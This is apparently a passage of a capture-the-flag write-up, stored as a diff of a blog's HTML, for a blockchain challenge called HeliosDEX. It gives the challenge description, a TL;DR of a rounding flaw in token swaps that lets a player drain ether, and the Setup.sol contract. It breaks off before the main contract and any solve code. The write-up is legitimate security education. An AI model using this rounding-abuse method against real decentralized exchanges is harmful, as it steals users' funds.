@@ -1,0 +1,1341 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+
+  
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Use openzeppelin functions they said, there is no way you use them badly, they said">  
+
+
+  
+  <meta property="og:type" content="website">
+  <meta property="og:description" content="Use openzeppelin functions they said, there is no way you use them badly, they said" />
+  <meta property="og:image" content="https://s3.eu-central-1.amazonaws.com/htb-ctf-prod-public-storage/ctf/banners/3cV8Qop1kWK65XPyiZrrj932xKLU3rJqNuHeNO0Z.jpg" />
+  <meta property="og:url" content="https://wepfen.github.io/writeups/htb-cyberapocalypse-2025-heliosdex/">
+  <meta property="og:title" content="HTB Cyber Apocalypse CTF 2025 - HeliosDEX [blockchain]">
+  <meta property="og:site_name" content="wepfen.github.io">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="wepfen.github.io">
+  <meta property="twitter:url" content="https://wepfen.github.io/writeups/htb-cyberapocalypse-2025-heliosdex/">
+  <meta name="twitter:title" content="HTB Cyber Apocalypse CTF 2025 - HeliosDEX [blockchain]">
+  <meta name="twitter:description" content="Use openzeppelin functions they said, there is no way you use them badly, they said">
+  <meta name="twitter:image" content="https://s3.eu-central-1.amazonaws.com/htb-ctf-prod-public-storage/ctf/banners/3cV8Qop1kWK65XPyiZrrj932xKLU3rJqNuHeNO0Z.jpg">
+  
+  <title>
+    
+      HTB Cyber Apocalypse CTF 2025 - HeliosDEX [blockchain]
+    
+  </title>
+
+
+  <link rel="icon" type="image/gif" href="/images/oia-uia.gif" />
+   
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.9bb372a616563f9ecafd6e5ea0d7760c487f35e7358f212b258b477fbfa75f5264ef33aaffa0334383ffc444b631b8dc5c496c67b5830ab2ac1f1e226a1125c3.css" integrity="sha512-m7NyphZWP57K/W5eoNd2DEh/Nec1jyErJYtHf7&#43;nX1Jk7zOq/6AzQ4P/xES2MbjcXElsZ7WDCrKsHx4iahElww==" />
+
+  
+
+
+</head>
+
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css" integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV" crossorigin="anonymous">
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8" crossorigin="anonymous"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+      delimiters: [
+        {left: '$$', right: '$$', display: true},     
+        {left: '$', right: '$', display: false},  	  
+      ],
+      throwOnError : false
+    });
+  });
+</script>
+
+
+
+    
+    <body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">~/</a>
+
+
+
+
+<script src="/js/theme-toggle.f10bb0c6283b259e63664053a20ccc48c8b0980e44bceece1c10401c529c2040.js" integrity="sha256-8Quwxig7JZ5jZkBTogzMSMiwmA5EvO7OHBBAHFKcIEA="></script>
+
+<button style="float: right; background: none; outline: none;" onclick="toggleTheme()">
+
+<svg class="w-6 h-6 text-gray-800 dark:text-white theme" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+  <path fill-rule="evenodd" d="M7.05 4.05A7 7 0 0 1 19 9c0 2.407-1.197 3.874-2.186 5.084l-.04.048C15.77 15.362 15 16.34 15 18a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1c0-1.612-.77-2.613-1.78-3.875l-.045-.056C6.193 12.842 5 11.352 5 9a7 7 0 0 1 2.05-4.95ZM9 21a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1Zm1.586-13.414A2 2 0 0 1 12 7a1 1 0 1 0 0-2 4 4 0 0 0-4 4 1 1 0 0 0 2 0 2 2 0 0 1 .586-1.414Z" clip-rule="evenodd"/>
+</svg>
+
+</button>
+
+
+
+
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2025-03-25 23:47:23 &#43;0100 CET">
+            2025-03-25
+        </time>
+    </p>
+
+    <h1>HTB Cyber Apocalypse CTF 2025 - HeliosDEX [blockchain]</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#recon">Recon</a>
+      <ul>
+        <li><a href="#smart-contracts">Smart Contracts</a></li>
+        <li><a href="#reading-the-code">Reading the code</a>
+          <ul>
+            <li><a href="#setupsol">Setup.sol</a></li>
+            <li><a href="#heliosdexsol">HeliosDEX.sol</a>
+              <ul>
+                <li><a href="#definitions">Definitions</a>
+                  <ul>
+                    <li><a href="#dex-in-a-nutshell">DEX in a nutshell</a></li>
+                    <li><a href="#erc20-in-a-nutshell">ERC20 in a nutshell</a></li>
+                  </ul>
+                </li>
+                <li><a href="#the-contract">The contract</a>
+                  <ul>
+                    <li><a href="#constructors">Constructors</a></li>
+                    <li><a href="#swap-functions">swap functions</a></li>
+                    <li><a href="#withdraw-function">withdraw function</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#solving">Solving</a>
+      <ul>
+        <li><a href="#vulnerability">Vulnerability</a></li>
+        <li><a href="#getting-the-flag">Getting the flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <blockquote>
+<p>Difficulty : Easy</p>
+</blockquote>
+<blockquote>
+<p>Team : Phreaks 2600</p>
+</blockquote>
+<blockquote>
+<p>Description : You stand victorious, panting, over the fallen form of Eldorion. The beast&rsquo;s eternal resilience proved no match for your cunning and skill, adventurer. The path to the city gates of Eldoria now lies open, but the journey is far from over. As you approach, a shimmering structure catches your eye: the HeliosDEX, a decentralized exchange powered by the radiant energy of Helios himself. Whispers tell of travelers using this exchange to amass fortunes, stocking up on rare items and crucial supplies before braving the perils of Eldoria. Perhaps you can use this opportunity to your advantage&hellip;</p>
+</blockquote>
+<blockquote>
+<p>Author : <a href="https://github.com/perrythepwner/">PerryThePwner</a></p>
+</blockquote>
+<blockquote>
+<p>Topics : DEX, ERC20, Rounding</p>
+</blockquote>
+<h1 id="tldr">TL;DR</h1>
+<ul>
+<li>
+<p>When converting ethers to  MalakarEssence (MAL) or HeliosLuminaShards (HLS) token, it is rounded up to the next integer, even if we convert 0.000000000000000001 ether , it is rounded up to 1 ETHER</p>
+</li>
+<li>
+<p>Repeat the operation until we have enough token to withdraw.</p>
+</li>
+<li>
+<p>Give enough allowance to the DEX, refund the tokens and get the ethers.</p>
+</li>
+</ul>
+<h1 id="introduction">Introduction</h1>
+<p>For this challenge, we are dealing with three <strong>ERC20</strong> contracts and a <strong>decentrized exchange</strong> (DEX) with which we can <strong>swap</strong> ethers for ERC20 tokens.</p>
+<h1 id="recon">Recon</h1>
+<h2 id="smart-contracts">Smart Contracts</h2>
+<p>Here are the smart contracts :</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">Setup.sol</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">28</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> { HeliosDEX } <span style="color:#e67e80">from</span> <span style="color:#b2c98f">&#34;./HeliosDEX.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> Setup {
+</span></span><span style="display:flex;"><span>    HeliosDEX <span style="color:#e67e80">public</span> TARGET;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">public</span> player;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> DeployedTarget(<span style="color:#dbbc7f">address</span> at);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">address</span> _player) <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        TARGET <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> HeliosDEX{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">1000</span> <span style="color:#e67e80">ether</span>}(<span style="color:#d699b6">1000</span>);
+</span></span><span style="display:flex;"><span>        player <span style="color:#7a8478">=</span> _player;
+</span></span><span style="display:flex;"><span>        emit DeployedTarget(<span style="color:#dbbc7f">address</span>(TARGET));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">isSolved</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> player.<span style="color:#d699b6">balance</span> <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">20</span> <span style="color:#e67e80">ether</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<br>
+<details>
+  <summary style="color: #F99417; cursor: pointer">HeliosDEX.sol</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">  9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 90
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 91
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 92
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 93
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 94
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 95
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 96
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 97
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 98
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 99
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">100
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">101
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">102
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">103
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">104
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">105
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">106
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">107
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">108
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">109
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">110
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">111
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">112
